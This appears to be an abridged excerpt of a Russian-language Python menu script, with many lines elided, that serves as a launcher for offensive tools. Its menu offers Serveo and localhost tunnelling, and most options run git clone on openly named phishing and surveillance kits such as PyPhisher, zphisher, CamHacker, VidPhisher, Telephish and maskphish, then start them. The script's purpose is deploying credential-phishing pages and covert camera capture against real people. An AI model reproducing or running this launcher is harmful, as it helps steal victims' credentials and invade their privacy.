...
while True:
    ...
    if inp == '1':
        ...
        if os.path.exists(filename):
            ...
            res()
            print (Style.BRIGHT,Fore.YELLOW+"["+Fore.CYAN+"i"+Fore.YELLOW+"] Serveo позволяет туннелировать трафик")
            res()
            ...
            if tru_201 == 'e':
                ...
                print(Style.BRIGHT,Fore.CYAN+"[Serveo]")
                print(Fore.WHITE+'', Style.BRIGHT)
                print (Style.BRIGHT,Fore.YELLOW+"["+Fore.CYAN+"i"+Fore.YELLOW+"] Закрыть туннелирование: "+Fore.RED+"Ctrl + C")
                print(Fore.WHITE+'', Style.BRIGHT)
    ...
    if inp == '2':
        ...
        if os.path.exists(filename):
            ...
            res()
            print (Style.BRIGHT,Fore.YELLOW+"["+Fore.CYAN+"i"+Fore.YELLOW+"] Localhost позволяет туннелировать трафик")
            res()
            print(Style.BRIGHT,Fore.GREEN+"["+Fore.CYAN+"!"+Fore.GREEN+"] Пример порта:"+Fore.CYAN+" 8080")
            res()
            print(Style.BRIGHT,Fore.RED+"[e] Выход")
    ...
    if inp == '3':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://gitlab.com/KasRoudra/PyPhisher')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '4':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/htr-tech/zphisher')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '5':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://gitlab.com/KasRoudra/CamHacker')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '6':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://gitlab.com/KasRoudra/VidPhisher')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '7':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/lamer112311/Telephish')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '8':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/lamer112311/Dnnme2')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '9':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/jaykali/maskphish.git')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
